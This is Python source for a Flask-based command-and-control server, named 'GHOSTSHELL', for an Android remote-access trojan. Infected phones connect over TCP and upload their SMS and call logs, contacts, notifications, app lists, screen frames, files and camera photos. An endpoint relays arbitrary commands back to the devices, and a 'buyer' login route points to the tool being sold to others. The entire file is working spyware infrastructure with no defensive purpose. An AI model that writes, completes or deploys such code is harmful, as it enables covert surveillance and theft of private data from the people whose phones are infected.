import socket
import json
import threading
import base64
import os
import time
from flask import Flask, request, jsonify, render_template, send_from_directory, session
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = 'GHOSTSHELL_CP_MASTER'

clients = {}
server_logs = []
lock = threading.Lock()

DIRS = ['captured_images', 'device_downloads']
for d in DIRS:
    if not os.path.exists(d): os.makedirs(d)

def add_log(msg):
    t = time.strftime("%H:%M:%S")
    server_logs.insert(0, f"[{t}] {msg}")
    if len(server_logs) > 50: server_logs.pop()

def create_client_data():
    return {
        "sms": [], "calls": [], "apps": [], "notifications": [], "contacts": [],
        "fm": {"path": "/", "files": []}, "gallery": {"page": 0, "files": []},
        "info": {}, "location": {"status": "idle"},
        "media": {"last_img": None}, "screen": None
    }

def handle_tcp_data(raw_line, cid):
    try:
        packet = json.loads(raw_line).get('data', {})
        t = packet.get('type')
        with lock:
            if cid not in clients: return
            cd = clients[cid]['data']
            
            if t == 'DEVICE_INFO': cd['info'].update(packet.get('info', {}))
            elif t == 'SMS_LOG': cd['sms'] = packet.get('logs', [])
            elif t == 'CALL_LOG': cd['calls'] = packet.get('logs', [])
            elif t == 'CONTACT_LIST': cd['contacts'] = packet.get('contacts', [])
            elif t == 'APP_LIST': cd['apps'] = packet.get('apps', [])
            elif t == 'SCREEN_FRAME': cd['screen'] = packet.get('frame')
            elif t == 'NOTIFICATION_DATA': cd['notifications'].insert(0, packet.get('notification', {}))
            elif t == 'FILE_MANAGER_RESULT': cd['fm'].update(packet.get('listing', {}))
            elif t == 'GALLERY_PAGE_DATA': cd['gallery'].update(packet.get('data', {}))
            elif t == 'CAMERA_PHOTO':
                photo = packet.get('photo_data', {})
                fname = photo.get('filename')
                b64_data = photo.get('data')
                if fname and b64_data:
                    with open(os.path.join('captured_images', secure_filename(fname)), 'wb') as f:
                        f.write(base64.b64decode(b64_data))
                    cd['media']['last_img'] = fname
            add_log(f"RCV {t} from {cid}")
    except Exception as e: print(f"ERR: {e}")

def client_handler(conn, addr):
    cid = f"{addr[0]}:{addr[1]}"
    with lock: clients[cid] = {'socket': conn, 'data': create_client_data()}
    buffer = ""
    try:
        while True:
            chunk = conn.recv(16384).decode('utf-8', errors='ignore')
            if not chunk: break
            buffer += chunk
            while '\n' in buffer:
                line, buffer = buffer.split('\n', 1)
                if line.strip(): handle_tcp_data(line.strip(), cid)
    except: pass
    finally:
        with lock: 
            if cid in clients: del clients[cid]
        conn.close()

def tcp_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 8888))
    s.listen(20)
    while True:
        c, a = s.accept()
        threading.Thread(target=client_handler, args=(c, a), daemon=True).start()

@app.route('/api/status')
def get_status():
    owner = request.args.get('owner')
    devs = []
    with lock:
        for k, v in clients.items():
            info = v['data']['info']
            if owner and info.get('Owner') != owner: continue
            devs.append({'id': k, 'model': info.get('Model', '?'), 'bat': info.get('Battery', '?')})
    return jsonify({"devices": devs})

@app.route('/api/data/<cid>')
def get_data(cid):
    with lock: return jsonify(clients[cid]['data'] if cid in clients else {"error": 404})

@app.route('/api/command', methods=['POST'])
def send_cmd():
    r = request.json
    cid, cmd = r.get('client_id'), r.get('cmd')
    with lock:
        if cid in clients:
            try:
                clients[cid]['socket'].sendall(f"{cmd}\n".encode())
                return jsonify({"status": "ok"})
            except: pass
    return jsonify({"status": "fail"}), 404

@app.route('/api/buyer/login', methods=['POST'])
def buyer_login():
    return jsonify({"status": "ok"}) 

@app.route('/captured_images/<path:f>')
def serve_img(f): return send_from_directory('captured_images', f)

if __name__ == '__main__':
    threading.Thread(target=tcp_server, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
